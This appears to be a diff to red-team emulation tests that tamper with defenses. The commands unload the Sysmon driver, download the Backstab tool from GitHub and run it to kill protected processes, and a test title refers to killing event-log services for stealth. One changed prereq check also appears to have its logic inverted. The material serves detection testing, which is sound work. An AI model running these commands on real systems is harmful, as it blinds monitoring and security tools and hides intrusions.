@@ -186,34 +186,38 @@ atomic_tests:
   - description: |
       Sysmon must be downloaded
     prereq_command: |
-      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
+      if (-not (cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe")) { exit 0 } else { exit 1 }
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip"
-      Expand-Archive PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip PathToAtomicsFolder\..\ExternalPayloads\Sysmon -Force
-      Remove-Item PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip -Force
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip" "PathToAtomicsFolder\..\ExternalPayloads\Sysmon" -Force
   - description: |
       sysmon must be Installed
     prereq_command: |
       if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
     get_prereq_command: |
       if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
-      { Set-Location PathToAtomicsFolder\..\ExternalPayloads\Sysmon\; .\Sysmon.exe -accepteula -i}
+      { & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i}
   - description: |
       sysmon filter must be loaded
     prereq_command: |
       if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
     get_prereq_command: |
-      sysmon -u
-      sysmon -accepteula -i
+      if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe"){
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u
+        & "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i
+      }else{
+        sysmon -u
+        sysmon -accepteula -i
+      }
   executor:
     command: |
       fltmc.exe unload #{sysmon_driver}
     cleanup_command: |
       sysmon -u -i > nul 2>&1
       sysmon -i -accepteula -i > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -u > nul 2>&1
-      %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -u > nul 2>&1
+      "PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe" -accepteula -i > nul 2>&1
     name: command_prompt
     elevation_required: true
 - name: Uninstall Sysmon
@@ -606,12 +610,13 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: Backstab64.exe should exist in ExtrnalPayloads Directory
-    prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe) {exit 0} else {exit 1}
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
   executor:
-    command: '& PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe -k -n #{process_name}'
+    command: |
+      & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
     name: powershell
     elevation_required: true
 - name: WinPwn - Kill the event log services for stealth
